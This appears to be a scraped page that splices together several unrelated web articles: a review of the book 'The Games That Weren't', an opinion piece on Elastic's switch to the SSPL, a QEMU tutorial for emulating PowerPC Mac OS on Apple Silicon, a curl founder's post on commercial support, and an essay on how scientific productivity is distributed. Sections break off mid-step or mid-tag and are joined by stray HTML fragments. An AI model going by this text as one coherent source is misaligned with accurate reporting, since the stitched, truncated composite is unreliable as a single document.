<p>As games industry legend David Crane tells us in the foreword, this is all about games that never quite reached the game-playing public. Going all the way back to 1975 and up to 2015, the book covers 80 games that weren’t, and they weren’t for myriad reasons that all get unravelled here – flawed game design, internal politics, over-ambition, poor hardware sales, high cartridge costs or cabinet costs, failed field tests, expired licenses, not being able to fit a computer cartoon into 48K… Actually, I should say that Scooby Doo in the Castle Mystery didn’t make the cut here (which gives me hope that it still might arrive one day!), but some of the tales around these unreleased games are definitely mysteries worthy of Scooby and the gang!</p>

<p>Having spent some time in my stack of old game magazines just get my head around enough of the Scooby Doo story to mention it here, I can really empathise with Frank’s decades-long obsession with investigating these mysteries – that 30 minutes putting together a timeline from first advert to previews, doubts, cancellations then something else emerging in its place was really fascinating! But where I’ve just included a picture of an old copy of C&amp;VG, every game covered in The Games That Weren’t includes a load of development assets, screenshots, photos and artistic impressions – all reproduced in the very highest quality and sometimes for the first time – to illustrate the wonderfully in-depth analysis on each game.</p>

<p>Before we analyse that analysis, let’s quickly mention a few of those games to give us a bit of context, as well as what is probably my favourite thing about the book, which is not only discovering stuff you didn’t know existed, but discovering stuff you would have actually bought, and even seeing screenshots of it! And that’s why we’ll start with Elite on the Nintendo Game Boy, which got to prototype stage then the deal with Ocean fell through and consigned it to history; another nice feature is that for each game it tells you if it’s available to play or not… And apparently this one is, so definitely expect more from me on that in the future! We all know about Elite, but there’s an awful lot more that you probably won’t know anything about, such as Death Pit, Dick Special, Eye of the Moon, Virtua Hamster(!), Spitfire Fury  and Starring Charlie Chaplin to name but a few. There’s unreleased sequels like Heart of Yesod, Star Fox 2 and, er, Gazza 2. There’s all kinds of film licenses that (possibly thankfully) never saw the light of day like The Terminator, Lethal Weapon and Waterworld, as well as other licenses like Daffy Duck and Tony Hawk’s Shred Session. And then there’s the versions of games you probably do know but never made it, like Rescue on Fractalus! or Bubble Bobble, Ridge Racer or The Last Ninja…</p>

<p>As I write this, the last game I played before I went to bed last night was Arcade Archives Frogger on Nintendo Switch, so I reckon that Frogger 2: Swampy’s Revenge on Nintendo 64 is the perfect place to talk about the actual meat of the game analysis you’re getting here! It starts with a title screen summarising the reason it weren’t – cartridge costs in this case – then the year it weren’t (2000), the developer, the platform and whether or not it’s available to play. Then we get some background history – why Frogger epitomises 1980s arcades, the aim of the game, its reception and its ports. Then we get into what happened next; in the case of Frogger, it obviously never stopped being released on different platforms, but there was a Hasbro remake developed by Millenium Interactive in 1997 that leads us directly into the non-sequel. When Hasbro wanted a sequel, Millenium weren’t available to do it, so they approached Interactive Studios. We then hear from Philip Oliver, and then the project’s technical manager, Matt Cloy, who talks about the team and how they set about developing the game for the Nintendo 64. We get right into the development kits and all the juicy technical details here, right from the horse’s mouth, as well as some great detail on the process of developing then moving on from the earliest designs. </p>



<p>This turned into very much a 3D game, in stark contrast to the overhead 2D original, with complex geometries and some wild-sounding environments that weren’t too far removed from Super Mario Galaxy, years ahead of its time. But Hasbro didn’t like it! Need something more traditional, more 2D, more like Frogger. So then we hear about how it was all stripped back, the action became more immediate to the player, and a story was introduced involving Swampy the Crocodile being jealous of Frogger’s fame and fortune! At this point we start getting some really nice detail about how the game actually played as levels took shape and started to be tested and tweaked, and then there’s some substitutions made in the team to bring on some experience and make sure the game was brought home as planned. </p>



<figure><img data-attachment-id="1546" data-permalink="https://retroarcadia.blog/2021/01/13/book-review-the-games-that-werent-by-frank-gasking/img_2384/" data-orig-file="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg" data-orig-size="3884,2913" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;1.8&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;iPhone XS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1610461038&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.25&quot;,&quot;iso&quot;:&quot;200&quot;,&quot;shutter_speed&quot;:&quot;0.016666666666667&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="img_2384" data-image-description="" data-medium-file="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=300" data-large-file="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=700" src="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=1024" alt="" srcset="https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=1024 1024w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=2048 2048w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=150 150w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=300 300w, https://retroarcadia.files.wordpress.com/2021/01/img_2384.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>And then it was all brought down with a bang! Hasbro got cold feet on increasing cartridge production costs and lead times, and the prospect of any profit was becoming risky, so at 70% complete, the Nintendo 64 version was canned. Now we jump to the PlayStation, PC, Dreamcast and Game Boy Colour versions that did eventually make it into the wild, reviewed okay, but never really had a chance to sell properly because after a year Konami said they wanted it removed from sale because the licence had expired! Now we get into the fun part of years then passing, glitchy prototypes sneaking out into the hands of collectors, and later builds appearing that featured things like placeholder sounds from other games and Pac-Man styled frogspawn collecting that would never have made the final cut. Finally, we get to what happened next, where we are now with availability of the various unfinished states online, and how the developers feel about the project in retrospect. And as we’ve already discussed, all those written words are supported by some beautiful visuals, in this case a full-page unpublished advert for the game including the Nintendo 64 logo at the top, and a selection of half-page, well-curated (and well-defined) screenshots that serve perfectly well to bring the game to life. It really is an incredibly polished package, and that’s all for just one of the eighty games!</p>



<p>Now, not every game gets the thousands of words of research and interviews that Frogger 2 gets – though an awful lot of them do – but regardless, you can see the care, attention and passion that’s gone into every single feature on every single game. And all of this this is complemented by five purpose-built “Hardware That Wasn’t” blueprint features and a load of interviews with the likes of the aforementioned David Crane, Jeff Minter, the Oliver Twins, Matthew Smith, Geoff Crammond and many other industry big-hitters, plus an honourable mentions section on loads of other games, all in chronological order, that you can find out more about digitally.</p>

      <section itemprop="text">
        
        <p>In a play to convert users of their open source projects into paying customers, today Elastic announced that they are <a href="https://www.elastic.co/blog/licensing-change">changing the license</a> of both Elasticsearch and Kibana from the open source Apache v2 license to <a href="https://www.mongodb.com/licensing/server-side-public-license">Server Side Public License</a> (SSPL). If your organisation uses the open source versions of either Elasticsearch or Kibana in its products or projects, it is now at risk of being forced to release its intellectual property under terms dictated by another.</p>

<p>If you’re not yet aware of the SSPL, you can catch up <a href="https://mjg59.dreamwidth.org/51230.html">here</a>. As licenses go, it’s pretty problematic from a business perspective. Every <a href="https://en.wikipedia.org/wiki/Intellectual_property">IP lawyer</a> to whom I’ve showed the text of the SSPL has been rather alarmed before they even reach the end of it. Basically, it’s a hostile proprietary license masquerading in open source clothing. By using an SSPL project in your code, you are agreeing that if you provide an online service using that code then you will release not only that code but also the code for every supporting piece of software, all under the SSPL. It’s not a stretch to interpret the wording of the license as requiring users of the SSPL’d software therefore to release the code for everything straight down to the bare metal. There are those who will point to <a href="https://www.mongodb.com/licensing/server-side-public-license/faq">the FAQ</a> for the SSPL and claim that the license isn’t interpreted in that way because the FAQ says so. Unfortunately, when you agree to a license you are agreeing to the <em>text of that license document</em> and not to a FAQ. If the text of that license document is ambiguous, then so are your rights and responsibilities under that license. Should your compliance to that license come before a judge, it’s <em>their</em> interpretation of those rights and responsibilities that will hold sway. This ambiguity puts your organisation at risk.</p>

<p>In <a href="https://www.elastic.co/blog/licensing-change">its announcement</a>, Elastic claims that this is simply a change of open source license. In one way they’re correct: they’re changing the license away from the open source Apache v2 license. However they are changing to what can best be described as a proprietary source available license, <em>not</em> to an open source one. MongoDB, the originators of SSPL, requested that <a href="https://opensource.org/">Open Source Initiative</a> (OSI) (the standards body that maintains the <a href="https://opensource.org/osd-annotated">Open Source Definition</a> and certifies licenses as open source) certify the SSPL as such. After a great deal of discussion among the panel of legal, licensing, and open source experts, MongoDB withdrew the SSPL from consideration as an open source license, as it appeared highly unlikely it would be certified as open source. That SSPL is not an open source license is no longer in dispute. That ship has sailed. If you have a problem with this, I suggest you <a href="https://lists.opensource.org/pipermail/license-discuss_lists.opensource.org/2019-May/020483.html">take it up</a> with OSI. As for Elastic’s public and verifiably false claim that SSPL is an open source license, it’s my hope that OSI will have a conversation with them and make a public statement of their own shortly.</p>

<p>No, this is a business decision, not an ideological one. Elastic made a business decision to change to this hostile proprietary license to give them a way to <del>extort</del>influence users to become customers. Without a great deal more strategic information about Elastic’s business and operations none of us are qualified to judge whether it’s the correct decision, but the decision itself is valid. They are allowed to make this sort of strategic move for their company.</p>

<p>However, you and your organisation have now also been forced into a business decision. If your organisation uses the Apache v2 licensed Elasticsearch or Kibana in its projects or products, it must now assume that it is at risk one way or another. It can upgrade to version 7.11 of these projects, thereby accepting the terms of SSPL and potentially also being required to release the code for its entire stack (a great deal of which it will not have the copyright over and will be unable to release, thereby potentially being in violation of SSPL). It can remain on version 7.10, but then it will no longer receive future updates, including important security fixes, thereby taking on another sort of risk. It could choose to pay for a Gold+ license for the software, but it’s unlikely that the budget is prepared for this sort of unexpected expense. And finally it can rearchitect its project or product, replacing Elasticsearch and/or Kibana with alternatives. Frankly, considering today’s unfriendly move by Elastic, putting some space between it and your organisation may be the safest alternative in the long run, but it will come with its own considerable price tag in time and other potential opportunity and switching costs.</p>

<p>The one thing your organisation cannot afford to do is ignore this. It’s time to call a meeting with your legal, software development, product, finance, and strategy teams to start to figure out the best option for you.</p>

Still, in this example, I'm using <a href="https://brew.sh/">Homebrew</a>, a package manager for macOS/OSX that allows you to install software via the CLI and manage easily. </p> <p>Now, this post wouldn't be very exciting if I tried this on my Mac Pro, but I decided to try it on my MacBook M1. Thus far, the community has succeeded in getting QEMU to install the ARM version Windows, so I decided to do the more silly path and get PPC and X86 working on Apple Silicon. I encountered very little resistance, which surprised me as I haven't seen/read anyone trying this route. It's surprsingly very usable but the usefulness is going to be limited. I was able to play Sim City 2000 on Mac OS 9.2 at a fairly high resolution. For the sake of brevity, I'm going to skip over installing Homebrew on an Apple M1, but you'll want to use the arch -x86_64 method, which requires prepending. I've gotten OS 10.0 and nearly gotten Windows 10 working on my M1.</p> <p> <iframe width="560" height="315" src="https://www.youtube.com/embed/aeSx4pm4MwY" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe> </p>  <p>Included below is the instruction for both Apple Silicon and Intel Macs.</p> <hr> <br> <h3>Requirements</h3> <ul> <li>Basic understanding of the terminal in OS X/macOS</li> <li>Apple Silicon (M1) computer (or Intel) Mac</li> <li>Xcode</li> <li>xcode-select (CLI Tools) <code>xcode-select --install</code></li> <li>Homebrew</li> </ul> <p> <img src="http://blog.greggant.com/images/posts/2021-01-13/2021-01-13-osx.jpg" alt="Mac OS X in QEMU"></p> <h3>Step 1: Install QEMU</h3> <p>This is the only step where Apple Silicon and Intel Macs differ. You'll need to install the x86 version of QEMU for the Apple silicon macs first.</p> <h4>Apple Silicon</h4> <figure><pre><code data-lang="bash">    <span>arch</span> <span>-x86_64</span> brew <span>install </span>qemu </code></pre></figure> <h4>x86 Intel Macs</h4> <figure><pre><code data-lang="bash">    brew <span>install </span>qemu </code></pre></figure> <h3>Step 2: Create a disk image</h3> <p>The rest of the steps do not need any specification for M1 vs. Intel.</p> <p>You can specify a route, but I just used the default pathing, the 2G = 2 GB below. You can get away with much less for OS X OS 9. If you'd like more space, change the size of the simulated HDD. .</p> <figure><pre><code data-lang="bash">    qemu-img create <span>-f</span> qcow2 myimage.img 2G </code></pre></figure> <h3>Step 3: Launching the emulated computer and the tricky part: Formatting the HDD</h3> <p>Now that we have a blank hard disk image, we're ready to go.</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> d <span>-M</span> mac99 <span>-m</span> 512 <span>-hda</span> myimage.img  <span>-cdrom</span> path/to/disk/image  </code></pre></figure> <p>Let's break this down so it's not just magic. The first command is the qemu core emulator, you can use things like 64-bit x86 CPU <code>qemu-system-x86_64 </code> or a 32-bit CPU <code>qemu-system-i386 </code>, but we're using a PPC, so we are using <code>qemu-system-ppc</code>. </p> <p>Next, we're declaring PC bios with <code>-L pc-bios</code>, I'm unsure if this is necessary. This seems to be the default even in Mac QEMU. After that, the <code>-boot</code> flag declares the boot drive. For those who remember the days of yore, C is the default drive for PCs, D is the default for the CD-Rom like a PC. It's weird, I know. <code>-M</code> is the model flag. It's pretty esoteric, but <a href="http://people.redhat.com/pbonzini/qemu-test-doc/_build/html/topics/PowerPC-System-emulator.html">QEMU uses OpenBIOS</a>, and mac99 is the model for Beige G3s. The lowercase <code>-m</code> is memory, expressed in megabytes, but you can use 1G or 2G for 1 or 2 gigabytes like the format utility. <code>-hda</code> is the image we're using. Finally, <code>-cdrom</code> is the installer image</p> <h3>Step 3.5: Special considerations between operating systems</h3> <p>I discovered that OS X 10.0's installer has a significant flaw: It doesn't have a disk utility. The disk images are black disks thus have no file system. If you want to run OS X 10.0, you'll need to first launch an installer that can format HFS like OS 9 or later versions of OS X, run the disk utility, format the image and then exit out of the emulator. The process would look like this:</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> d <span>-M</span> mac99 <span>-m</span> 512 <span>-hda</span> myimage.img  <span>-cdrom</span> path/to/disk/macosx10.4 or macOS9  </code></pre></figure> <p>Then format the drive from the utility, quit the emulator (control-c on the terminal window).</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> d <span>-M</span> mac99 <span>-m</span> 512 <span>-hda</span> myimage.img  <span>-cdrom</span> path/to/disk/macosx10.0</code></pre></figure> <h3>Step 4: after the installer fininshes</h3> <p>You will end up seeing a failed boot screen after the installer finishes. This is normal. Either quit the QEMU instance or use control-c in the terminal to close it. Now that it's installed, we want to boot off the internal drive.</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> c <span>-M</span> mac99 <span>-m</span> 512 <span>-hda</span> myimage.img    </code></pre></figure> <p>MacOS 9 seems to do slightly better when adding the via=pmu and specifying the graphics.</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> c  <span>-M</span> mac99,via<span>=</span>pmu  <span>-g</span> 1024x768x32  <span>-m</span> 512 <span>-hda</span> os9.img  </code></pre></figure> <h3>Step 5: mounting disk images</h3> <p>There's not a lot to do with an OS without software. You can mount plenty of disk image formats</p> <figure><pre><code data-lang="bash">qemu-system-ppc <span>-L</span> pc-bios <span>-boot</span> c <span>-M</span> mac99 <span>-m</span> 512 <span>-hda</span> myimage.img  <span>-cdrom</span> path/to/disk</code></pre></figure> <p> <img src="http://blog.greggant.com/images/posts/2021-01-13/2021-01-13-simcity.jpg" alt="Sim City 2000 in QEMU on Apple Silicon"></p> <h3>Bonus round: Trying for x86 64 Windows 10</h3> <p> <img src="http://blog.greggant.com/images/posts/2021-01-13/2021-01-13-proof.jpg" alt="Windows in QEMU on Apple Silicon"></p> <h3>Step 6: Multi CD-Rom Installs or swapping Disk Images</h3> <p>Older applications and OS installers require mutliple disk images.

It looks very feasible.

<p>I founded the curl project early 1998 but had already then been working on the code since <a href="https://daniel.haxx.se/blog/2021/01/03/age-is-just-a-number-or-two/" data-type="post" data-id="15434">November 1996</a>. The source code was always open, free and available to the world. The term “open source” actually wasn’t even coined until early 1998,  just weeks before curl was born.</p>



<div><figure><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol.png" alt="" width="125" height="108" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol.png 789w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-200x175.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-450x394.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2016/05/curl-symbol-768x672.png 768w" sizes="(max-width: 125px) 100vw, 125px"></figure></div>



<p>In the beginning of course, the first few years or so, this project wasn’t seen or discovered by many and just grew slowly and silently in a dusty corner of the Internet.</p>



<p>Already when I shipped the first versions I wanted the code to be open and freely available. For years I had seen the cool free software put out the in the world by others and I wanted my work to help build this communal treasure trove.</p>



<h2>License</h2>



<p>When I started this journey I didn’t really know what I wanted with curl’s license and exactly what rights and freedoms I wanted to give away and it took a few years and attempts before it landed.</p>



<p>The early versions were <a href="https://opensource.org/licenses/GPL-2.0">GPL licensed</a>, but as I learned about resistance from proprietary companies and thought about it further, I changed the license to be more commercially friendly and to match my conviction better. I ended up with <a href="https://opensource.org/licenses/MIT">MIT</a> after a brief experimental time using <a href="https://opensource.org/licenses/MPL-1.1">MPL</a>. (It was easy to change the license back then because I owned all the copyrights at that point.)</p>



<p>To be exact: we actually have a <a href="https://curl.se/docs/copyright.html">slightly modified MIT license</a> with some very subtle differences. The reason for the changes have been forgotten and we didn’t get those commits logged in the “big transition” to Sourceforge that we did in late 1999…  The end result is that this is now often recognized as “the curl license”, even though it is in effect the MIT license.</p>



<p>The license says everyone can use the code for whatever purpose and nobody is required to ship any source code to anyone, but they cannot claim they wrote it themselves and the license/use of the code should be mentioned in documentation or another relevant location.</p>



<p>As licenses go, this has to be one of the most frictionless ones there is.</p>



<h2>Copyright</h2>



<p>Open source relies on a solid copyright law and the copyright owners of the code are the only ones who can license it away. For a long time I was the sole copyright owner in the project. But as I had decided to stick to the license, I saw no particular downsides with allowing code and contributors (of significant contributions) to retain their copyrights on the parts they brought. To not use that as a fence to make contributions harder.</p>



<p>Today, in early 2021, I count 1441 copyright strings in the curl source code git repository. 94.9% of them have my name.</p>



<p>I never liked how some projects require copyright assignments or license agreements etc to be able to submit code or patches. Partly because of the huge administrative burden it adds to the project, but also for the significant friction and barrier to entry they create for new contributors and the unbalance it creates; some get more rights than others. I’ve always worked on making it easy and smooth for newcomers to start contributing to curl. It doesn’t happen by accident.</p>



<h2>Spare time</h2>



<p>In many ways, running a spare time open source project is easy. You just need a steady income from a “real” job and sufficient spare time, and maybe a server to host stuff on for the online presence.</p>



<p>The challenge is of course to keep developing it, adding things people want, to help users with problems and to address issues timely. Especially if you happen to be lucky and the user amount increases and the project grows in popularity.</p>



<p>I ran curl as a spare time project for decades. Over the years it became more and more common that users who submitted bug reports or asked for help about things were actually doing that during their <em>paid</em> work hours because they used  curl in a commercial surrounding – which sometimes made the situation almost absurd. The ones who actually got paid to work with curl were asking the unpaid developers to help them out.</p>



<p>I changed employers several times. I started my own company and worked as my own boss for a while. I worked for Mozilla on network stuff in Firefox for five years. But curl remained a spare time project because I couldn’t figure out how to turn it into a job without risking the project or my economy.</p>



<h2>Earning a living</h2>



<p>For many years it was a pipe dream for me to be able to work on curl as a real job. But how do I actually take the step from a spare time project to doing it full time? I give away all the code for free, and it is a solid and reliable product.</p>



<div><figure><a href="https://www.wolfssl.com/"><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo.png" alt="" width="186" height="144" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo.png 1011w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-200x155.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-450x348.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2019/01/wolfssl-logo-768x594.png 768w" sizes="(max-width: 186px) 100vw, 186px"></a></figure></div>



<p>The initial seeds were planted when I met and got to know Larry (wolfSSL CEO) and some of the other good people at <a href="https://www.wolfssl.com/">wolfSSL</a> back in the early 2010s. This, because wolfSSL is a company that write open source libraries and offer commercial support for them – proving that it can work as a business model. Larry always told me he thought there was a possibility waiting here for me with curl.</p>



<p>Apart from the business angle, if I would be able to work more on curl it could really benefit the curl project, and then of course indirectly everyone who uses it.</p>



<p>It was still a step to take. When <a href="https://daniel.haxx.se/blog/2018/11/18/im-leaving-mozilla/" data-type="post" data-id="11748">I gave up on Mozilla</a> in 2018, it just took a little thinking before I decided to try it. <a href="https://daniel.haxx.se/blog/2019/02/02/im-on-team-wolfssl/" data-type="post" data-id="11915">I joined wolfSSL</a> to work on curl full time. A dream came true and finally curl was not just something I did “on the side”. It only took 21 years from first curl release to reach that point…</p>



<p>I’m living the open source dream, working on the project I created myself.</p>



<h2>Food for free code</h2>



<p>We sell commercial support for curl and libcurl. Companies and users that need a helping hand or swift assistance with their problems can get it from us – and with me here I dare to claim that there’s no company anywhere else with the same ability. We can offload engineering teams with their curl issues. Up to 24/7 level!</p>



<p>We also offer custom curl development, debugging help, porting to new platforms and basically any other curl related activity you need. See more on the <a href="https://www.wolfssl.com/products/curl/">curl product page</a> on the wolfSSL site.</p>



<p>curl (mostly in the shape of libcurl) runs in <strong>ten billion installations</strong>: some five, six billion mobile phones and tablets – used by several of the most downloaded apps in existence, in virtually every website and Internet server. In a billion computer games, a billion Windows machines, half a billion TVs, half a billion game consoles and in a few hundred million cars… curl has been made to run on 82 operating systems on 22 CPU architectures. Very few software components can claim a wider use.</p>



<p><em>“Isn’t it easier to list companies that are <strong>not</strong> using curl?”</em></p>



<p>Wide use and being recognized does not bring food on the table. curl is also totally free to download, build and use. It is very solid and stable. It performs well, is documented, well tested and “battle hardened”. It “just works” for most users.</p>



<h2>Pay for support!</h2>



<p>How to convince companies that they should get a curl support contract with me?</p>



<p>Paying customers get to influence what I work on next. Not only distant road-mapping but also how to prioritize short term bug-fixes etc. We have a guaranteed response-time.</p>



<p>You get your issues first in line to get fixed. Customers also won’t risk getting their issues added the known bugs document and put in the attic to be forgotten. We can help customers make sure their application use libcurl correctly and in the best possible way.</p>



<p>I try to emphasize that by getting support from us, customers can  take away some of those tasks from their own engineers and because we are  faster and better on curl related issues, that is a pure net gain economically. For all of us.</p>



<p><strong>This is not an easy sell.</strong></p>



<p>Sure, curl is used by thousands of companies everywhere, but most of them do it because it’s free (in all meanings of the word), functional and available. There’s a real challenge in identifying those that actually use it enough and  value the functionality enough that they realize they want to improve their curl foo.</p>



<p>Most of our curl customers purchased support first when they faced a complicated issue or problem they couldn’t fix themselves –  this fact gives me this weird (to the wider curl community) incentive to <em>not</em> fix some problems too fast, because it then makes it work against my ability to gain new customers!</p>



<p>We need paying customers for this to be sustainable. When wolfSSL has a sustainable curl business, I get paid and the work I do in curl benefits all the curl users; paying as well as non-paying.</p>



<h2>Dual license</h2>



<p>There’s clearly business in releasing open source under a strong copyleft license such as GPL, and as long as you keep the copyrights, offer customers to purchase that same code under another more proprietary- friendly  license. The code is still open source and anyone doing totally open things can still use it freely and at no cost.</p>



<p>We’ve shipped <a href="https://curl.se/tiny/">tiny-curl</a> to the world licensed under GPLv3. Tiny-curl is a curl branch with a strong focus on the<em><strong> </strong></em><strong>tiny</strong> part: the idea is to provide a libcurl more suitable for smaller systems, the ones that can’t even run a full Linux but rather use an RTOS.</p>



<p>Consider it a sort of experiment. Are users interested in getting a smaller curl onto their products and are they interested in paying for licensing. So far, tiny-curl supports two separate RTOSes for which we haven’t ported the “normal” curl to.</p>



<h2>Keeping things separate</h2>



<p>Maybe you don’t realize this, but I work hard to keep separate things compartmentalized. I am not curl, curl is not wolfSSL and wolfSSL is not me.  But we  all overlap greatly!</p>



<figure><a href="https://daniel.haxx.se/blog/wp-content/uploads/2021/01/curl-circles.jpg"><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2021/01/curl-circles.jpg" alt="" width="599" height="562"></a><figcaption>The Daniel + curl + wolfSSL trinity</figcaption></figure>



<p>I work for wolfSSL. I work on curl. wolfSSL offers commercial curl support.</p>



<h2>Reserved features</h2>



<p>One idea that we haven’t explored much yet is the ability to make and offer “reserved features” to paying customers only. This of course as another motivation for companies to become curl support customers.</p>



<p>Such reserved features would still have to be sensible for the curl project …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>In previous posts I <a href="https://nintil.com/hhmi-and-nih">said</a> that the extent to which "Fund people" works will depend on the distribution of scientific talent. Think about the following situation: Imagine that only a handful of scientists at every point in time are able to –if given the time and means–lead revolutions on par with the work of Darwin, Einstein, or Galileo (This is an extreme case admittedly because most of science does not look like this; most of science is more incremental and less memorable). I recently found two authors that believe something like this,</p>
<p>Braben, whose <a href="https://nintil.com/review-scientific-freedom">book</a> <em>Scientific Freedom</em> I reviewed says that even though most scientists could be the next Einstein if they tried, only a few will even try:</p>
<blockquote>
<p>It is possible that my message may be seen as elitist and of interest only to <strong>those very few scientists who might be putative members of a twenty - first century Planck Club</strong>. That interpretation would be wrong. One of the themes here is that almost every serious researcher is at some time in a career capable of taking those fateful steps that might lead to a great discovery or the creation of penetrating new insight. They might then need to draw on vast reserves of courage and determination, and perhaps also a little luck if they are to make progress. At any one time, of course, <strong>the proportion of researchers ready to seize that possibly once - in - a - lifetime opportunity will be very small</strong>, so if they are prevented from doing so the democratic pressure they can exert is insignifican't. [...] a properly constituted TR initiative should appeal to only a small number of scientists with radical thoughts on their minds. The challenge is to recognize them as there are millions of scientists, and one does not even know which haystack hides the needle. [...] <strong>Let us assume that there were about 300 transformative researchers — the extended membership of the Planck Club — during the twentieth century.</strong></p>
</blockquote>
<p>In physics, <a href="https://www.amazon.com/Trouble-Physics-String-Theory-Science/dp/061891868X">Lee Smolin</a> is even more on the elitist side, with even fewer scientists in the revolutionaries' club:</p>
<blockquote>
<p>“But when it comes to theoretical physics, we are not talking about much money at all. Suppose that an agency or foundation decided to fully support <strong>all the visionaries</strong> who ignore the mainstream and follow their own ambitious programs to solve the problems of quantum gravity and quantum theory. <strong>We are talking about perhaps</strong> <strong>two dozen theorists</strong>. Supporting them fully would take a tiny fraction of any large nation’s budget for physics.”</p>
</blockquote>
<p>I think there is something to this view, and it is not incompatible with what I said in my last blogpost (That peer review can select the best work). In physics, there has been <a href="https://nintil.com/is-useful-physics-over/">no progress</a> in the <a href="https://www.amazon.com/Trouble-Physics-String-Theory-Science/dp/061891868X">fundamentals</a> of the <a href="https://www.amazon.com/Lost-Math-Beauty-Physics-Astray/dp/0465094252/ref=tmm_hrd_swatch_0?_encoding=UTF8&amp;qid=1610576984&amp;sr=8-2">field</a> since the 70s, so one could argue that perhaps there are key assumptions that need to be thrown away, that there is a strong need for funding what to many physicists seem obviously wrong. In that case peer review may be stifling progress: physics could benefit from less clever math and more philosophical thought, going back to the mode of thinking of Einstein et al. as Smolin suggests. Braben does not oppose peer review in general, he argues that peer review will systematically underrate those coming up with paradigm-breaking ideas, and most of science is not that.</p>
<p>
[1]. Who are biology's geniuses? Darwin? Biology is probably less of a Kuhnian world than physics is, given that biology has fewer strong assumptions baked in that would have to be overthrown and thus count as a revolution
</p>
<p>In biology, in contrast with physics, whatever the current framework is (if any)<sup><a href="#sidenote-1">1</a></sup>, it continues to be extremely fruitful. If one takes <a href="https://www.nobelprize.org/uploads/2020/10/advanced-chemistryprize2020.pdf">CRISPR</a>, which has been arguably been a case of "good science", one can break it down into:</p>
<ol>
<li>
<p>Noticing that there are suspicious repetitive sequences in certain bacteria</p>
</li>
<li>
<p>Figuring out what those are for</p>
</li>
<li>
<p>Leveraging them into a tool for gene editing</p>

<p>None of these examples of good science (Or perhaps engineering if you count the last 2) are paradigm shifts but without any doubt CRISPR has been highly useful and influential, both in academia, and soon in the clinic.</p>

Is science like this, or even more extreme? <a href="https://journals.plos.org/plosone/article?id=10.1371/journal.pone.0101698">Ioannidis</a> et al. (2014) note there are 15M scientists that published anything in the 1996-2011 period, but only 1% that has published every single year in this period. This smaller 150k-strong group accounts for 40% of all papers and 87% of all papers with &gt;1000 citations.</p>
<p>Nobel Prize winner William Shockley published (<a href="https://ieeexplore.ieee.org/document/4056505">1957</a>) a paper measuring the distribution of productivity in an already high-performing environment: the Los Alamos Scientific Laboratory as well as the Brookhaven National Laboratory. Shockley finds a log-normally distribution of publications and patents: Most scientists publish very little and a progressively smaller count publish increasingly more.</p>
<p>There's the observation of Lotka's law (Yes, it's the same Lotka as in Lotka-Volterra) that says that the relative frequency of authors with a given number of publications follows a power law that scales with the square of the number of articles published; for example out of 100 scientists who publishes at least 1 article, only 1 will publish 10 articles. The precise exponent may vary by discipline (Pao, <a href="https://asistdl.onlinelibrary.wiley.com/doi/abs/10.1002/(SICI)1097-4571(198601)37:1%3C26::AID-ASI4%3E3.0.CO;2-Z">1985</a>), but each one does seem to follow the same pattern: A handful of people publish an overwhelming fraction of all the papers.</p>
<p>We could say "We only remember a handful of scientists that advanced modern physics, so that must imply you only need that handful". Back in the early 20th century, how many physicists did "useful" work that ended up leading to currently accepted and useful knowledge? Sure we remember Einstein, Planck, Hilbert, Lorentz, Mach, Poincaré, and Minkowski. But How many physicists total were there back then? Lotka's paper samples Auerbach's <em><a href="https://archive.org/details/geschichtstafel00auergoog">Geschichtstafeln der Physik</a></em> (1910) which compiles physicists the author considered sufficiently important. The book was published 5 years after Einstein's Annus Mirabilis and he's not yet cited there, Auerbach stops at the year 1900. Turns out there are more physicists than just the famous ones (Perhaps we are biased towards those that worked in one particular area that ended up changing the foundations of physics). For example we have <a href="https://en.wikipedia.org/wiki/Heinrich_Kayser">Heinrich Kayser</a> who did pioneering work on, and coined the expression, "adsorption". I bet you hadn't heard of him before. It wouldn't be enough to just count all the names in the <em>Geschichtstafeln</em> and then try to come up with a total count of physicists; even that book can be undercounting physicists that still contributed (For example, that were cited by the authors mentioned in the book). Fortunately now we have indices with journals and citations so we can truly take something closer to the entire population of scientists and explore in more detail the <em>Ortega hypothesis</em>.</p>

<blockquote>
